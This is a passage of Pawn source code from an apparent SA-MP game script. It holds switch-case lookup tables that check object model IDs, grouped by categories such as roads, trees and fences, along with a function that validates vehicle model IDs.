		16195, 16196, 16197, 16199, 16200, 16201, 16203, 16204, 16205, 16206, 16207, 16208, 16209, 16211, 16212, 16213,
		16214, 16215, 16216, 16217, 16218, 16219, 16220, 16221, 16222, 16224, 16225, 16226, 16227, 16228, 16229, 16230,
		16231, 16232, 16234, 16235, 16236, 16237, 16239, 16240, 16241, 16242, 16243, 16244, 16245, 16246, 16247, 16248,
		16249, 16250, 16251, 16252, 16253, 16254, 16255, 16256, 16257, 16258, 16259, 16260, 16261, 16262, 16263, 16264,
		16397, 16421, 16422, 16423, 16424, 16593, 16693, 16694, 17079, 17080, 17082, 17085, 17086, 17087, 17089, 17092,
		17104, 17105, 17121, 17123, 17124, 17125, 17127, 17128, 17134, 17135, 17472, 17500, 17506, 17507, 17541, 17545,
		17559, 17567, 17568, 17619, 17633, 17645, 17677, 17685, 17689, 17892, 17906, 18293, 18294, 18295, 18296, 18297,
		18298, 18299, 18300, 18301, 18302, 18303, 18304, 18305, 18306, 18307, 18308, 18309, 18310, 18311, 18312, 18313,
		18314, 18315, 18316, 18317, 18318, 18319, 18320, 18321, 18324, 18325, 18326, 18327, 18328, 18329, 18330, 18335,
		18336, 18337, 18342, 18346, 18347, 18348, 18349, 18353, 18355, 18360, 18361, 18362, 18363, 18364,
		18469, //concrete and rock landmasses
		3522, 4701, 4702, 4810, 4815, 4842, 4843, 4844, 4845, 4847, 4851, 4852, 4859, 4875, 4876, 4897, 4898, 5036, 5114,
		5172, 5424, 5427, 5428, 5429, 5443, 5457, 5458, 5471, 5624, 5640, 5743, 5812, 5871, 5875, 5878, 5887, 5987, 6006,
		6007, 6065, 6094, 6203, 6233, 6234, 6236, 6315, 6356, 6487, 7032, 7353, 7359, 7457, 7458, 7459, 7461, 7475, 7536,
		7537, 7579, 7582, 7616, 7998, 8002, 8007, 8008, 8072, 8091, 8200, 8459, 8460, 8461, 8462, 8468, 8532, 8654, 8655,
		8868, 8983, 9046, 9082, 9086, 9087, 9206, 9207, 9208, 9210, 9211, 9212, 9213, 9214, 9217, 9218, 9219, 9225, 9226,
		9235, 9242, 9248, 9276, 9305, 9345, 9353, 9519, 9554, 9555, 9556, 9596, 9605, 9606, 9607, 9609, 9610, 9611, 9614,
		9616, 9617, 9863, 9889, 9891, 9930, 10034, 10087, 10151, 10273, 10290, 10358, 10384, 10386, 10400, 10403, 10411, 10414,
		10415, 10416, 10417, 10418, 10419, 10420, 10421, 10422, 10451, 10453, 10454, 10491, 10492, 10560, 10562, 10601, 10612,
		10613, 10616, 10618, 10637, 10638, 10694, 10851, 10861, 10862, 10863, 10864, 10903, 10904, 10905, 10917, 10926, 10939,
		10959, 10960, 10961, 10962, 10972, 10983, 11097, 11106, 11107, 11223, 11224, 11225, 11226, 11297, 11303, 11332, 11335,
		11340, 11362, 11363, 11364, 11408, 11509, 11510, 11514, 11515, 11516, 11520, 11521, 11524, 11530, 11537, 11538, 11539,
		11540, 11541, 11552, 11554, 11555, 11557, 11560, 11628, 12804, 12814, 12824, 12825, 12864, 12865, 12866, 12868, 12869,
		12871, 12872, 12916, 12989, 13017, 13019, 13021, 13030, 13035, 13036, 13039, 13040, 13041, 13042, 13043, 13044, 13049,
		13050, 13051, 13070, 13071, 13072, 13081, 13082, 13084, 13099, 13100, 13101, 13102, 13104, 13105, 13107, 13120, 13121,
		13122, 13123, 13124, 13125, 13126, 13147, 13148, 13149, 13150, 13156, 13157, 13158, 13163, 13165, 13167, 13172, 13177,
		13180, 13181, 13207, 13208, 13209, 13210, 13211, 13212, 13235, 13236, 13237, 13297, 13370, 13371, 13490, 13679, 13686,
		13691, 13692, 13698, 13700, 13702, 13710, 13711, 13715, 13716, 13719, 13723, 13734, 13737, 13740, 13741, 13742, 13756,
		13757, 13795, 13809, 13818, 13821, 13823, 13824, 13825, 13826, 13871, 13872, 16183, 16194, 16198, 16202, 16210, 16233,
		16238, 16684, 16685, 17075, 17081, 17083, 17084, 17088, 17090, 17091, 17093, 17094, 17095, 17096, 17097, 17098, 17099,
		17100, 17101, 17102, 17103, 17106, 17107, 17108, 17109, 17113, 17114, 17115, 17116, 17117, 17118, 17119, 17122, 17126,
		17129, 17130, 17131, 17132, 17133, 17136, 17137, 17138, 17139, 17140, 17141, 17142, 17143, 17144, 17145, 17301, 17302,
		17471, 17548, 17574, 17589, 17594, 17601, 17614, 17615, 17616, 17617, 17618, 17620, 17664, 17665, 17678, 17691, 17696,
		17864, 17865, 17866, 17877, 17878, 17880, 17881, 18231, 18322, 18323, 18331, 18332, 18333, 18334, 18338, 18339, 18340,
		18341, 18343, 18344, 18345, 18350, 18351, 18352, 18354, 18356, 18357, 18358, 18359, 18473, 18475, 18485, //grass and dirt landmasses
		955, 956, 1209, 1302, 1775, 1776, 1977, 2212, 2213, 2214, 2215, 2216, 2217, 2218, 2219, 2220, 2221, 2222, 2223, 2342,
		2353, 2354, 2355, 2420, 2425, 2427, 2429, 2438, 2453, 2647, 2663, 2683, 2702, 2703, 2767, 2768, 2769, 2814, 2821, 2823,
		2837, 2838, 2839, 2840, 2856, 2857, 2858, 2859, 2860, 2861, 2866, 2867, 2880, 2881, //food and drinks
		1426, 1428, 1436, 1437, 1464, 1465, 1466, 1467, 1469, 1470, 1471, 1473, 1474, 1475, 1476, 1477, 1519, 1521, 1656,
		1698, 2633, 3361, 3399, 3671, 3674, 3867, 4106, 4120, 4121, 4170, 4171, 4180, 4231, 4565, 4575, 4737, 4738, 4824, 4881,
		4882, 5268, 5301, 5308, 5627, 5822, 7659, 8572, 8580, 8613, 8614, 8615, 9316, 9484, 9566, 9618, 9767, 9814,
		9815, 9816, 10008, 10026, 10033, 10042, 10152, 10153, 10173, 10174, 10175, 10176, 10177, 10178, 10179, 10180, 10181,
		10185, 10234, 10309, 10672, 11472, 11479, 11493, 11496, 11544, 12839, 12950, 12958, 12985, 12987, 13011, 13644, 13749, 14387,
		14394, 14395, 14407, 14409, 14410, 14411, 14414, 14416, 14596, 14874, 14877, 16082, 16322, 16649, 16651, 16661, 16731, 17904,
		18366, 18368, //Ladders,Stairs, and Scaffolding
		3268, 3271, 3277, 3279, 3280, 3386, 3387, 3388, 3389, 3390, 3391, 3392, 3393, 3394, 3395, 3396, 3400, 3401, 3786, 3787,
		3788, 3789, 3790, 3791, 3792, 3793, 3794, 3795, 3797, 3885, 16093, 16639, 16640, 16641, 16642, 16643, 16644, 16645,
		16647, 16648, 16654, 16656, 16657, 16658, 16660, 16662, 16663, 16665, 16681, 16682, //industrial Military
		918, 1217, 1218, 1222, 1244, 1676, 1686, 1985, 3057, 3267, 3426, 3472, 3525,
		3534, 3743, 3864, 3877, 6965, 7073, 7268, 7388, 7392, 8483, 8491, 8492, 8980, 9831, 9833, 10397,
		10764, 11417, 13562, 13667, 16135, 16368, 16777, 16778, 16779, 16782, //industrial Special
		1211, 1214, 1215, 1216, 1223, 1257, 1258, 1262, 1263, 1269, 1270, 1278, 1283, 1284, 1285, 1286,
		1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1306, 1307, 1308, 1315, 1319, 1340, 1341, 1342, 1346,
		1350, 1351, 1352, 1363, 1366, 1367, 1478, 1568, 1570, 1571, 2600, 3398, 3407, 3408, 3447, 3459, 3460, 3463, 3516, 3853, 3854,
		3855, 3860, 3861, 3862, 3863, 3875, 6289, 6299, 6462, //street and road items ( poles etc. )
		625, 626, 627, 628, 630, 631, 632, 633, 635, 636, 637, 638, 639, 640, 644, 646, 647, 650, 651, 653, 675, 677, 678, 679, 682,
		692, 701, 702, 728, 741, 742, 743, 753, 754, 755, 756, 757, 759, 760, 761, 762, 800, 801, 802, 803, 804, 805, 806, 808, 809,
		810, 811, 812, 813, 814, 815, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 855, 856, 857, 859, 860, 861, 862, 863,
		864, 865, 866, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 948, 949, 950, 1360, 1361, 1364, 1597, 1807, 2001, 2010, 2011,
		2194, 2195, 2203, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 2248, 2250, 2251, 2252, 2253, 2254, 2345, 2811, 3409,
		3439, 3450, 3520, 3532, 3660, 3802, 3806, 3810, 3811, 4034, 4172, 4173, 4174, 4175, 4184, 4185, 4981, 4982, 4984, 4985, 4986,
		4992, 4993, 5023, 5024, 5025, 5078, 5150, 5234, 5265, 5266, 5290, 5322, 5324, 5325, 5327, 5328, 5339, 5407, 5412, 5417, 5565,
		5629, 5633, 5634, 5635, 5636, 5637, 5638, 5641, 5682, 5847, 5877, 5888, 6046, 6204, 6214, 6237, 6362, 6372, 6386, 6399, 6403,
		6421, 6430, 6431, 6444, 6499, 7095, 7595, 7662, 7884, 7952, 7953, 7954, 7986, 8319, 8321, 8617, 8619, 8623, 8660, 8679, 8825,
		8826, 8827, 8828, 8835, 8836, 8837, 8846, 8852, 8887, 8888, 8889, 8982, 8989, 8990, 8991, 9019, 9034, 9035, 9152, 9153, 9317,
		9318, 9331, 9333, 9334, 9335, 9336, 9344, 9347, 9348, 9350, 9812, 10445, 11413, 11414, 13174, 13699, 13748, 13802, 14400, 14402,
		14468, 14469, 14804, 14834, 15038, 16390, 17528, 17532, 17872, 17874, 17875, 17876, 17879, 17886, 17887, 17891, 17905, 17907, 17937,
		17938, 17939, 17941, 17942, 17947, 17958, 18011, 18012, 18013, 18014, 18015, //plants
		744, 745, 746, 747, 748, 749, 750, 751, 752, 758, 807, 816, 828, 867, 868, 879, 880, 896, 897, 898, 899, 900, 901, 905, 906,
		1207, 1303, 1304, 4816, 9044, 9045, 9743, 9744, 9745, 9746, 10166, 10984, 10985, 10986, 11498, 11556, 13023, 13635, 16104,
		16110, 16111, 16112, 16113, 16114, 16115, 16116, 16117, 16118, 16119, 16120, 16121, 16122, 16123, 16124, 16125, 16126, 16127, 16128,
		16129, 16130, 16131, 16133, 16139, 16140, 16141, 16142, 16145, 16411, 16503, 16667, 16675, 16692, 17025, 17026, 17027, 17028, 17029,
		17030, 17031, 17032, 17033, 17034, 17035, 17069, 17071, 17076, 17299, 17456, 18225, 18226, 18227, 18228, //rock
		615, 616, 617, 618, 619, 621, 622, 623, 624, 629, 634, 641, 645, 648, 649, 652, 654, 655, 656, 657, 658, 659, 660, 661, 664,
		669, 670, 671, 672, 673, 674, 676, 680, 681, 683, 685, 686, 687, 688, 689, 690, 691, 693, 694, 695, 696, 697, 698, 700, 703, 704,
		705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 729, 730, 731,
		732, 733, 734, 735, 736, 737, 738, 739, 740, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779,
		780, 781, 782, 789, 790, 791, 792, 858, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 904, 3505, 3506,
		3507, 3508, 3509, 3510, 3511, 3512, 3517, 16060, 16061, 18268, 18269, 18270, 18271, 18272, 18273, //trees
		1681, 1682, 1683, 2469, 2470, 2472, 2473, 2510, 2511, 2512, 2773, 2774, 2775, 2781, 2792, 2793, 2794, 2795, 2796, 2797, 3489, 3491,
		3526, 3629, 3658, 3659, 3666, 3814, 3816, 3881, 3882, 4726, 4727, 4828, 4829, 4830, 4831, 4832, 4833, 4838, 4854, 4855, 4856, 4862,
		4863, 4864, 4865, 4866, 4867, 4869, 4874, 4890, 4990, 4991, 4995, 4996, 4997, 4998, 4999, 5000, 5002, 5003, 5004, 5006, 5009, 5034,
		6973, 7153, 7978, 7981, 8038, 8171, 8172, 8240, 8247, 8249, 8251, 8253, 8281, 8343, 8344, 8350, 8354, 8355, 8356, 8357, 8550, 9241,
		10029, 10755, 10756, 10757, 10758, 10760, 10761, 10763, 10766, 10767, 10768, 10769, 10810, 10815, 10816, 10817, 10818, 10819, 11283,
		11285, 14404, 14548, 14550, 14553, 16098, 16100, 16407, 16408, 16409, 16771, //airport objects
		3448, 3493, 4032, 4232, 4597, 4598, 4638, 4639, 4640, 4641, 4642, 4697, 6387, 6971, 6997, 7010, 7184, 7244, 7245, 7419, 7488, 7984,
		8040, 8390, 8407, 8410, 8420, 8841, 9957, 10010, 10051, 10621, 10629, 10778, 10779, 10780, 10781, 10782, 10783, 10784, 10785, 10786,
		10787, 10788, 17556, 17557, 17558, //car parks
		1451, 1452, 1453, 1454, 1457, 1458, 1479, 1480, 1482, 1483, 3252, 3286, 3375, 3402, 3403, 3419, 12915, 12917, 12918, 12919, 12920,
		12921, 12922, 13002, 13206, 13367, 14871, 14873, 14875, 16108, 16388, 16389, 16404, 16405, 16406, 17000, 17009, 17010, 17011, 17039,
		17052, 17053, 17054, 17057, 17058, 17059, 17060, 17061, 17063, 17074, 17298, 17324, 17457, //farm objects
		966, 968, 969, 970, 971, 972, 973, 974, 975, 976, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993,
		994, 995, 996, 997, 998, 1250, 1251, 1282, 1374, 1407, 1408, 1410, 1411, 1412, 1413, 1414, 1418, 1419, 1422, 1423, 1424,
		1425, 1427, 1434, 1435, 1446, 1447, 1456, 1459, 1460, 1552, 1553, 1648, 1652, 1653, 1662, 2098, 2395, 2400, 2650, 2651, 2755,
		3260, 3275, 3276, 3282, 3451, 3475, 3550, 3749, 3771, 3850, 4099, 4100, 4190, 4195, 4196, 4201, 4202, 4724, 5001, 5005, 5007, 5030,
		5062, 5070, 5071, 5072, 5073, 5074, 5075, 5076, 5077, 5051, 5068, 5081, 5082, 5190, 5306, 5338, 5893, 6049, 6960, 6961, 6967, 6968,
		6969, 6970, 7022, 7026, 7028, 7029, 7030, 7031, 7033, 7034, 7038, 7039, 7191, 7192, 7196, 7197, 7198, 7209, 7210, 7212, 7223, 7224,
		7227, 7277, 7292, 7319, 7361, 7367, 7368, 7369, 7370, 7371, 7377, 7378, 7379, 7380, 7381, 7418, 7423, 7504, 7505, 7514, 7517, 7518,
		7522, 7524, 7538, 7539, 7540, 7556, 7560, 7592, 7593, 7611, 7612, 7613, 7614, 7615, 7623, 7624, 7625, 7657, 7663, 7664, 7665, 7692,
		7837, 7838, 7839, 7840, 7841, 7842, 7893, 7894, 7919, 7920, 7921, 7922, 7923, 7924, 7933, 7939, 7956, 8041, 8042, 8147, 8148, 8149,
		8150, 8151, 8152, 8153, 8154, 8155, 8165, 8167, 8173, 8174, 8175, 8176, 8177, 8178, 8185, 8186, 8187, 8188, 8189, 8194, 8206, 8207,
		8208, 8209, 8210, 8229, 8262, 8263, 8311, 8313, 8314, 8315, 8320, 8342, 8369, 8416, 8481, 8549, 8556, 8559, 8645, 8646, 8647, 8648,
		8649, 8650, 8651, 8652, 8653, 8656, 8657, 8658, 8659, 8662, 8673, 8674, 8680, 8681, 8682, 8683, 8684, 8685, 8686, 8869, 8871, 9029,
		9030, 9031, 9032, 9033, 9041, 9292, 9293, 9294, 9295, 9296, 9297, 9298, 9330, 9332, 9337, 9339, 9340, 9343, 9349, 9482, 9608, 9893,
		10252, 10396, 10402, 10437, 10442, 10611, 10682, 10683, 10806, 10807, 10808, 10809, 10835, 10836, 10874, 10875, 10885, 10889, 10890,
		11014, 11091, 11238, 11239, 11240, 11241, 11242, 11243, 11247, 11438, 11452, 11473, 11474, 11499, 11551, 11567, 11568, 11571, 11607,
		11623, 12848, 12858, 12933, 13016, 13018, 13024, 13045, 13096, 13097, 13098, 13118, 13153, 13336, 13438, 13445, 13663, 13665, 13705,
		14464, 14459, 14843, 14856, 14883, 16016, 16017, 16018, 16019, 16020, 16022, 16052, 16094, 16136, 16281, 16293, 16294, 16295, 16296,
		16297, 16298, 16299, 16300, 16312, 16313, 16315, 16320, 16321, 16324, 16369, 16370, 16627, 16628, 16629, 16630, 16631, 16632, 16633,
		16634, 16635, 16636, 16638, 16664, 16668, 16669, 16670, 16671, 16683, 17510, 18074, 18202, 18216, 18218, 18219, 18220, 18221, 18222,
		18223, 18224, 18255, 18276, 18277, 18278, 18279, 18280, 18281, 18286, 18287, 18288, 18289, 18290, 18291, 18292, 18432, 18433, 18434,
		18440, 18441, 18442, 18443, 18444, 18445, 18446, //Fences, Walls, Gates, and Barriers
		3187, 3359, 3458, 3627, 4199, 4892, 5401, 5409, 5774, 5853, 6909, 6910, 7520, 7971, 8947, 8954, 9169, 9171, 9321, 9899, 10282, 10789,
		11292, 11326, 11387, 11388, 11389, 11390, 11391, 11392, 11393, 11480, 11494, 11504, 11505, 11547, 12853, 13296, 14776, 14783, 14796,
		14797, 14798, 14826, 14876, 16107, 16360, 16362, 16477, 17036, 17037, 17064, 17065, 17852,
		17950, 18232, 18283, 18284, 18452, 18474, //Structure Garages and Petrol Stations
		1245, 1503, 1631, 1632, 1633, 1634, 1655, 1660, 1696, 1697, 1894, 2931, 3269, 3270, 3363, 3364, 3625, 3663, 3664, 3665, 3852, 5152,
		5153, 6052, 7979, 7980, 16401, 8302, 8375, 12914, 12956, 13590, 13593, 13604, 13636, 13638, 13640, 13643, 13645,
		13648, 16077, 16084, 16085, 16134, 16302, 16303, 16304, 16305, 16317, 16367, 17565, 18262, 18367, 18451, 18565, 18566, 18567, 18568,
		18569, 18609, //ramps
		4817, 4818, 4819, 4853, 4884, 4885, 5064, 5117, 5118, 5119, 5127, 5272, 5275, 5277, 5347, 5396, 5398, 5399, 5477, 5478, 5479, 5480,
		5513, 5674, 5679, 5772, 5773, 6248, 6249, 6250, 6251, 6252, 6290, 6292, 6501, 6502, 6912, 6913, 6914, 6915, 6916, 6917, 6980, 6981,
		6982, 6983, 6984, 7498, 7499, 7500, 7501, 7502, 7503, 8538, 8539, 8540, 8541, 8542, 8586, 8587, 8588, 8624, 8625, 8626, 8627, 8628,
		8629, 8630, 8631, 8632, 8633, 8634, 8635, 8858, 8860, 9164, 9165, 9166, 9167, 9168, 9705, 10752, 10927, 10931, 10933, 10934, 10935,
		11101, 11228, 11229, 11230, 11231, 11232, 11464, 11465, 11466, 11467, 11468, 12831, 12832, 12833, 12835, 12836, 12837, 12838, 13312,
		13491, 16024, 16025, 16026, 16027, 16028, 16029, 16030, 16031, 16032, 16033, 16034, 16035, 16036, 16156, 17283, 17284, 17285, 17286,
		17287, 17288, 17289, 17290, 17291, 17292, 17296, 17297, //Railroads
		3330, 3331, 3381, 3411, 3412, 3990, 3991, 3992, 3993, 3994, 3995, 3996, 4085, 4086, 4087, 4088, 4089, 4090, 4091, 4107, 4108, 4125,
		4127, 4128, 4129, 4131, 4133, 4139, 4142, 4144, 4146, 4148, 4150, 4152, 4154, 4156, 4158, 4160, 4163, 4165, 4168, 4182, 4203, 4207,
		4209, 4233, 4553, 4557, 4567, 4589, 4644, 4645, 4646, 4647, 4648, 4649, 4650, 4651, 4652, 4653, 4654, 4656, 4658, 4660, 4662, 4664,
		4666, 4679, 4692, 4694, 4695, 4710, 4807, 4808, 4809, 4820, 4821, 4822, 4823, 4827, 4834, 4835, 4836, 4837, 4839, 4840, 4841, 4846,
		4868, 4870, 4871, 4872, 4878, 4895, 5013, 5021, 5026, 5028, 5038, 5046, 5052, 5106, 5112, 5113, 5120, 5121, 5124, 5125, 5128, 5133,
		5141, 5147, 5149, 5178, 5188, 5191, 5250, 5271, 5276, 5296, 5297, 5298, 5314, 5329, 5330, 5333, 5349, 5353, 5391, 5394, 5395, 5411,
		5431, 5432, 5433, 5434, 5435, 5436, 5437, 5438, 5439, 5440, 5441, 5442, 5456, 5469, 5470, 5472, 5473, 5481, 5482, 5483, 5484, 5485,
		5486, 5487, 5488, 5489, 5490, 5491, 5492, 5493, 5494, 5495, 5496, 5497, 5498, 5499, 5500, 5501, 5502, 5503, 5504, 5505, 5506, 5507,
		5508, 5509, 5510, 5511, 5512, 5528, 5650, 5668, 5703, 5707, 5744, 5745, 5746, 5747, 5748, 5749, 5750, 5751, 5752, 5753, 5754, 5755,
		5756, 5757, 5758, 5759, 5793, 5794, 5795, 5796, 5797, 5798, 5799, 5800, 5801, 5802, 5803, 5804, 5805, 5806, 5807, 5808, 5809, 5859,
		5860, 5861, 5862, 5866, 5994, 5995, 6035, 6054, 6055, 6111, 6112, 6113, 6114, 6115, 6116, 6117, 6118, 6119, 6120, 6121, 6122, 6123,
		6124, 6125, 6126, 6127, 6128, 6129, 6225, 6231, 6235, 6291, 6301, 6302, 6303, 6304, 6305, 6306, 6307, 6308, 6309, 6310, 6311, 6314,
		6316, 6317, 6318, 6319, 6320, 6321, 6322, 6323, 6324, 6325, 6326, 6327, 6329, 6330, 6331, 6333, 6341, 6345, 6427, 6428, 6448, 6449,
		6450, 6507, 6508, 6509, 6876, 6877, 6878, 6879, 6880, 6881, 6886, 6887, 6888, 6897, 6898, 6899, 6900, 6945, 6948, 6949, 6950, 6951,
		6952, 6953, 6956, 6974, 6990, 6991, 6999, 7036, 7041, 7042, 7043, 7052, 7053, 7054, 7055, 7056, 7057, 7064, 7069, 7320, 7321, 7324,
		7326, 7327, 7334, 7335, 7336, 7337, 7355, 7362, 7364, 7383, 7427, 7428, 7429, 7430, 7431, 7432, 7433, 7434, 7435, 7436, 7437, 7438,
		7439, 7440, 7441, 7442, 7443, 7444, 7445, 7446, 7447, 7476, 7477, 7478, 7479, 7480, 7481, 7482, 7483, 7484, 7485, 7486, 7544, 7545,
		7546, 7547, 7548, 7549, 7550, 7551, 7552, 7558, 7559, 7580, 7581, 7587, 7589, 7590, 7605, 7629, 7631, 7632, 7633, 7634, 7729, 7730,
		7731, 7755, 7849, 7852, 7854, 7863, 7864, 7865, 7866, 7867, 7868, 7878, 7881, 7938, 7945, 7963, 7965, 7967, 7969, 7987, 7988, 7989,
		7990, 7991, 7992, 7993, 7995, 8009, 8010, 8036, 8039, 8045, 8046, 8047, 8048, 8049, 8050, 8051, 8052, 8053, 8054, 8055, 8056, 8070,
		8080, 8128, 8135, 8137, 8212, 8213, 8214, 8215, 8216, 8217, 8218, 8219, 8236, 8244, 8245, 8246, 8256, 8290, 8305, 8368, 8377, 8380,
		8382, 8383, 8386, 8388, 8438, 8439, 8440, 8441, 8442, 8443, 8444, 8445, 8446, 8447, 8448, 8449, 8450, 8451, 8452, 8453, 8454, 8455,
		8456, 8457, 8458, 8471, 8472, 8473, 8474, 8475, 8476, 8477, 8510, 8511, 8512, 8514, 8517, 8518, 8519, 8520, 8521, 8522, 8523, 8524,
		8525, 8543, 8552, 8561, 8562, 8609, 8610, 8611, 8612, 8616, 8622, 8637, 8638, 8824, 8832, 8838, 8932, 9000, 9001, 9002, 9003, 9004,
		9005, 9006, 9007, 9008, 9021, 9022, 9023, 9024, 9025, 9026, 9027, 9028, 9036, 9042, 9115, 9116, 9117, 9118, 9119, 9120, 9150, 9205,
		9222, 9231, 9232, 9233, 9250, 9251, 9252, 9262, 9264, 9265, 9266, 9267, 9269, 9476, 9485, 9486, 9487, 9488, 9489, 9490, 9491, 9492,
		9493, 9570, 9571, 9575, 9591, 9600, 9601, 9602, 9603, 9652, 9653, 9683, 9685, 9689, 9690, 9693, 9694, 9696, 9699, 9700, 9701, 9702,
		9703, 9704, 9706, 9707, 9708, 9709, 9710, 9711, 9712, 9713, 9714, 9715, 9716, 9717, 9718, 9719, 9720, 9721, 9722, 9723, 9724, 9725,
		9726, 9727, 9728, 9729, 9730, 9731, 9732, 9733, 9734, 9735, 9736, 9747, 9827, 9832, 9837, 9838, 10018, 10065, 10066, 10067, 10068, 10069,
		10070, 10071, 10072, 10073, 10074, 10075, 10076, 10077, 10078, 10110, 10111, 10112, 10113, 10114, 10115, 10116, 10117, 10118, 10119, 10120,
		10121, 10122, 10123, 10124, 10125, 10126, 10127, 10128, 10129, 10130, 10131, 10132, 10133, 10134, 10135, 10136, 10137, 10138, 10139, 10165,
		10235, 10247, 10275, 10276, 10294, 10295, 10296, 10359, 10360, 10361, 10362, 10363, 10364, 10365, 10367, 10424, 10426, 10440, 10448, 10449,
		10450, 10452, 10455, 10456, 10457, 10458, 10459, 10460, 10461, 10462, 10463, 10464, 10465, 10466, 10467, 10468, 10469, 10470, 10471, 10472,
		10473, 10474, 10475, 10476, 10477, 10478, 10479, 10480, 10481, 10482, 10483, 10484, 10485, 10486, 10487, 10488, 10489, 10490, 10493, 10614,
		10617, 10636, 10639, 10649, 10750, 10751, 10753, 10754, 10759, 10770, 10777, 10790, 10791, 10792, 10820, 10821, 10822, 10823, 10848, 10849,
		10852, 10854, 10855, 10857, 10858, 10859, 10860, 10866, 10867, 10868, 10869, 10870, 10928, 10929, 10930, 10937, 10940, 10958, 10967, 10968,
		10970, 10971, 11003, 11071, 11072, 11073, 11074, 11075, 11076, 11077, 11078, 11079, 11080, 11084, 11094, 11095, 11096, 11098, 11100, 11104,
		11105, 11110, 11111, 11112, 11113, 11114, 11115, 11116, 11117, 11118, 11119, 11120, 11121, 11122, 11123, 11124, 11125, 11126, 11127, 11128,
		11129, 11130, 11131, 11132, 11133, 11134, 11135, 11136, 11137, 11138, 11252, 11253, 11254, 11255, 11256, 11257, 11258, 11259, 11260, 11261,
		11299, 11302, 11308, 11345, 11351, 11365, 11386, 11409, 11421, 11462, 12800, 12801, 12802, 12803, 12806, 12809, 12810, 12811, 12812, 12813,
		12815, 12816, 12817, 12818, 12819, 12820, 12826, 12827, 12828, 12829, 12830, 12851, 12852, 12856, 12857, 12867, 12873, 12874, 12875, 12876,
		12877, 12878, 12879, 12880, 12881, 12882, 12883, 12884, 12885, 12886, 12887, 12888, 12889, 12890, 12891, 12892, 12893, 12894, 12895, 12896,
		12897, 12898, 12899, 12900, 12901, 12902, 12903, 12904, 12905, 12906, 12907, 12909, 12910, 12965, 12966, 12967, 12968, 12970, 12971, 12972,
		12973, 12974, 12975, 12992, 12993, 12994, 12995, 12996, 12997, 12998, 12999, 13000, 13001, 13020, 13033, 13034, 13038, 13058, 13088, 13092,
		13095, 13119, 13127, 13128, 13129, 13138, 13139, 13141, 13142, 13168, 13169, 13170, 13173, 13321, 13323, 13324, 13325, 13332, 13342, 13345,
		13347, 13348, 13349, 13368, 13422, 13470, 13626, 13652, 13655, 13664, 13672, 13673, 13674, 13676, 13677, 13678, 13680, 13682, 13683, 13684,
		13685, 13688, 13689, 13690, 13693, 13703, 13704, 13706, 13707, 13708, 13709, 13713, 13717, 13718, 13720, 13726, 13727, 13730, 13732, 13733,
		13735, 13736, 13738, 13739, 13751, 13752, 13784, 13789, 13814, 13845, 13865, 13882, 13887, 16037, 16266, 16357, 16358, 16384, 16430, 16571,
		16610, 17002, 17003, 17004, 17043, 17062, 17077, 17078, 17110, 17111, 17112, 17120, 17146, 17148, 17150, 17152, 17154, 17156, 17158, 17160,
		17162, 17164, 17166, 17168, 17170, 17172, 17174, 17176, 17178, 17180, 17182, 17184, 17186, 17188, 17190, 17192, 17194, 17196, 17198, 17200,
		17202, 17204, 17208, 17210, 17212, 17214, 17216, 17218, 17220, 17222, 17224, 17226, 17228, 17230, 17232, 17234, 17236, 17238, 17240, 17242,
		17244, 17246, 17248, 17250, 17252, 17254, 17256, 17258, 17260, 17262, 17267, 17269, 17271, 17273, 17275, 17277, 17279, 17281, 17293, 17294,
		17295, 17300, 17303, 17305, 17307, 17308, 17309, 17310, 17326, 17327, 17329, 17331, 17333, 17334, 17501, 17502, 17525, 17550, 17561, 17576,
		17595, 17596, 17597, 17598, 17599, 17600, 17602, 17603, 17604, 17605, 17606, 17607, 17608, 17609, 17610, 17611, 17612, 17613, 17621, 17622,
		17623, 17624, 17625, 17626, 17627, 17628, 17629, 17630, 17631, 17632, 17634, 17635, 17637, 17638, 17639, 17640, 17641, 17642, 17643, 17644,
		17646, 17647, 17648, 17649, 17650, 17651, 17652, 17653, 17654, 17655, 17656, 17657, 17658, 17659, 17660, 17661, 17662, 17663, 17666, 17667,
		17668, 17669, 17670, 17671, 17672, 17673, 17674, 17675, 17676, 17680, 17681, 17682, 17683, 17684, 17686, 17687, 17692, 17693, 17695, 17829,
		17849, 17867, 17920, 17921, 17927, 17936, 17968, 18229, 18256, 18369, 18370, 18371, 18372, 18373, 18374, 18375, 18376, 18377, 18378, 18379,
		18380, 18381, 18382, 18383, 18384, 18385, 18386, 18387, 18388, 18389, 18390, 18391, 18392, 18393, 18394, 18449, 18450, 18561 //roads
		: return 1;
		default: return 0;
	}
	return 0;
}
//=[IsValidVehicleModelID]======================================================
stock IsValidVehicleModelID(vmodelid)
{   // by opium, improved by me
	switch(vmodelid)
	{
		case 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453,
		452, 446, 454, 445, 602, 416, 485, 568, 429, 433, 499, 424, 536, 496, 504, 422, 609, 498, 401, 575, 518,
		402, 541, 482, 431, 438, 457, 527, 483, 524, 415, 542, 589, 437, 532, 480, 596, 599, 597, 598, 578, 486,
		507, 562, 585, 427, 419, 587, 490, 528, 533, 544, 407, 565, 455, 530, 526, 466, 604, 492, 474, 588, 434,
		502, 503, 494, 579, 545, 411, 546, 559, 508, 571, 400, 403, 517, 410, 551, 500, 418, 572, 423, 414, 516,
		582, 467, 443, 470, 404, 514, 603, 600, 413, 426, 436, 547, 489, 441, 594, 564, 515, 479, 534, 432, 505,
		442, 440, 475, 543, 605, 495, 567, 428, 405, 535, 458, 580, 439, 561, 409, 560, 506, 601, 574, 566, 549,
		420, 459, 576, 525, 531, 408, 583, 451, 558, 552, 540, 491, 412, 478, 421, 529, 456, 554, 477, 548, 425,
		417, 487, 497, 563, 501, 465, 447, 469, 488, 406, 573, 444, 556, 557, 592, 577, 511, 512, 593, 520, 553,
		464, 476, 519, 460, 513, 539, 471, 435, 450, 591, 606, 607, 610, 584, 608, 611, 590, 449
		: return 1;
		default: return 0;
	}
	return 0;
}
